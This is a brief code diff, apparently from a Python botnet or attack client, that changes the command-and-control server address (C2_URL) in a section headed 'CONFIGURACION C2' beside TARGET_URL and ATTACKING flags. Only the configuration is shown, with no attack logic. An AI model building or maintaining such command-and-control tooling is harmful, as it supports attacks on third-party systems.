@@ -26,7 +26,7 @@ except ImportError:
 #                           CONFIGURACION C2
 # =====================================================================
 
-C2_URL = "https://76eced1d4485d6.lhr.life"
+C2_URL = "https://e84f556e3cdcff.lhr.life"
 TARGET_URL = None
 ATTACKING = False
 
